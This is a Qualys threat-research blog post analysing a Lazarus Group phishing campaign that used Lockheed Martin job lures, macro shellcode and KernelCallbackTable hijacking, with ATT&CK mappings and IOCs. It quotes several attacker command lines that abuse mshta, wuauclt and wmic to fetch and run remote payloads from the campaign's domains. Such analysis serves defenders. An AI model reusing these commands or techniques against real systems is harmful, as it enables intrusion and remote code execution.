# Reference for threat actor for "Lazarus Group, Hidden Cobra, Labyrinth Chollima"

**Title**: LolZarus: Lazarus Group Incorporating Lolbins into Campaigns | Qualys Security Blog

**Source**: https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns

## Content









LolZarus: Lazarus Group Incorporating Lolbins into Campaigns | Qualys Security Blog


















































































Discussions

Back to main menu
BROWSE BY TOPICBROWSE BY TOPIC
Global IT Asset Management
IT Security
Compliance
Cloud & Container Security
Web App Security
Certificate Security & SSL Labs
Developer API
Cloud Platform
Start a discussion


Blog
Training
Docs
Support
 





Community





































Blog Home

 





LolZarus: Lazarus Group Incorporating Lolbins into Campaigns 



 


 Akshat Pradhan, Senior Engineer, Threat Research, Qualys 

February 8, 2022December 23, 2022 - 5 min read						



 


Last updated on: December 23, 2022 

Table of ContentsSample AnalysisConclusionATT&CK MappingIOCSDomains

Qualys Threat Research has identified a new Lazarus campaign using employment phishing lures targeting the defence sector. The identified variants target job applicants for Lockheed Martin. This blog details the markers of this campaign, including macro content, campaign flow and phishing themes of our identified variants and older variants that have been attributed to Lazarus by other vendors.
The Qualys Research Team recently identified a new Lazarus campaign using employment phishing lures targeting the defence sector. The identified variants target job applicants for Lockheed Martin Corporation, which is an American aerospace, arms, defence, information security, and technology corporation. This is thematically similar to other observed variants where Lazarus has posed as defence companies like Northrop Grumman and BAE Systems with job openings. We refer to this campaign as “LolZarus” due to the use of different lolbins in observed samples, some of which are the lolbin’s first recorded usage by a well-known adversary.
Sample Analysis
We identified two phishing documents: “Lockheed_Martin_JobOpportunities.docx” and “Salary_Lockheed_Martin_job_opportunities_confidential.doc”. Both variants were authored by the same user, named “Mickey”. The methodology used for control flow hijack and the macro content is similar across both samples.
MD5: a27a9324d282d920e495832933d486ee
Name: Salary_Lockheed_Martin_job_opportunities_confidential.doc

Fig1. LockHeed Recruitment Lure
The macro uses aliases to rename the APIs that it uses (fig. 2).

Fig2. Renamed API aliases.
The initial entry point for the macro is via the ActiveX Frame1_Layout to automatically execute once ActiveX control is enabled (fig. 3).

Fig3. EntryPoint of obfuscated Macro.
The macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows media. Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).

Fig.4 WMV playback variables and wmvcore.dll function names
The macro uses a check for a document variable before entering its main functionality block. This variable is set at the end to ensure that subsequent opening of the document does not execute it again.
The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5). Other variants have used the UuidFromStringA function to decode the embedded payload and write it to an executable Heap.









Fig.5 Payload decoded via CryptStringToBinaryW.
The decoded shellcode then overwrites the WMIsAvailableOffline function from WMVCORE.dll by retrieving its address and changing its memory permissions.











Fig.6 VirtualProtect and memcpy’s.
The callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from the PEB structure of the current process via NtQueryInformationProcess, and then patching the _fnDWORD pointer to point to WMIsAvailableOffline. Whenever winword makes any graphical call, the shellcode executes. This technique to hijack control flow has also been used by other sophisticated attackers such as FinFisher. Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.
The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again. It also retrieves a decoy document from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)

Fig.7 Decoy Document.
The shellcode mainly sets up a periodic beacon out to https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder C:\WMAuthorization, writing a vbs file (WMVxEncd.vbs) to it, and creating a corresponding Scheduled task to run the vbs file every 20 minutes (fig. 8). shellObj is the Wscript.Shell object that the vbs file uses to execute the beacon command.
shellObj.Run "forfiles /p c:\windows /m HelpPane.exe /c ""mshta C:\WMAuthorization\WMPlaybackSrv ""https://markettrendingcenter.com/member.htm""""", 0, True

Fig.8 Schedule Task Dump
Here, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a renamed mshta.exe. Another variant of the campaign uses the lolbin wuauclt.
cmd /C ''C:\Windows\system32\wuauclt.exe' /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer
Earlier variants have used a copy of wmic.
%COMSPEC% /c Start /miN c:\Intel\hidasvc ENVIRONMENT get STATUS /FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”
Additional vendors have also identified a variant that uses pcalua.exe.Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.
Conclusion
We attribute this campaign to Lazarus as there is significant overlap in the macro content, campaign flow, and phishing themes of our identified variants as well as older variants that have been attributed to Lazarus by other vendors. Additional vendors have reported on the current campaign while attributing it to Lazarus.
Lazarus continues to evolve its capabilities by utilizing lesser-known shellcode execution techniques and incorporating various lolbins as part of its campaign. Qualys will continue to monitor for other similar phishing lures related to Lazarus.
Existing customers of Qualys can use the following QQL’s to identify this activity:
mitre.attack.technique.id:”Q0026” is 
mitre.attack.technique.id:”T1218.005”
mitre.attack.technique.id:”T1202”
mitre.attack.technique.id:”T1036.003”
mitre.attack.technique.id:”T1059.005”
ATT&CK Mapping
Phishing: Spearphishing Attachment T1566.001
Windows Management Instrumentation (T1047)
Masquerading: Rename System Utilities (T1036.003)
Signed Binary Proxy Execution: Mshta (T1218.005)
Command and Scripting Interpreter: Visual Basic (T1059.005)
Scheduled Task/Job: Scheduled Task (T1053.005)
Native API (T1106)
Hijack Execution Flow (T1574)
Command and Scripting Interpreter: Windows Command Shell (T1059.003)
IOCS
Hashes
e87b575b2ddfb9d4d692e3b8627e3921a27a9324d282d920e495832933d486ee3f326da2affb0f7f2a4c5c95ffc660cc490c885dc7ba0f32c07ddfe02a04bbb9712a8e4d3ce36d72ff74b785aaf18cb0a27a9324d282d920e495832933d486eef2a0e9034d67f8200993c4fa8e4f5d15
Domains
markettrendingcenter.com
lm-career.com
advantims.com

Related
 








Written by
 Akshat Pradhan, Senior Engineer, Threat Research, Qualys
Write to Akshat at apradhan@qualys.com



Like
Share



 


Share your Comments 


Comments Cancel replyYour email address will not be published. Required fields are marked *CommentName
Email
 Save my name, email, and website in this browser for the next time I comment.
 

Δ 









					Join the discussion today!


Learn more about Qualys and industry best practices.
				

Share what you know and build a reputation.
				

Secure your systems and improve security for everyone.
				



Start a discussion




Twitter
LinkedIn
Facebook
YouTube
Vimeo
 


QualysQualys.com
Qualys Community Edition
Qualys Merchandise Store
Qualys CommunitiesVulnerability Management
Policy Compliance
PCI Compliance
Web App Scanning
Web App Firewall
Continuous Monitoring
Security Assessment Questionnaire
Threat Protection
Asset Inventory
AssetView
CMDB Sync
Endpoint Detection & Response
Security Configuration Assessment
File Integrity Monitoring
Cloud Inventory
Certificate Inventory
Container Security
Cloud Security Assessment
Certificate Assessment
Out-of-band Configuration Assessment
Patch Management
Developer API
Cloud Agent
Dashboards & Reporting
DiscussionsAll discussions
Global IT Asset Management
IT Security
Compliance
Cloud & Container Security
Web App Security
Certificate Security & SSL Labs
Developer API
BlogAll posts
Qualys Insights
Product and Tech
Vulnerabilities and Threat Research
Release Notifications
TrainingOverview
Certified Courses
Video Library
Instructor-led Training
DocsOverview
Release Notes
SupportSupport Portal




© 2024 Qualys, Inc. All rights reserved. Privacy Policy




 

 




















































































Loading Comments...



 


Write a Comment...




Email (Required)



Name (Required)



Website


























































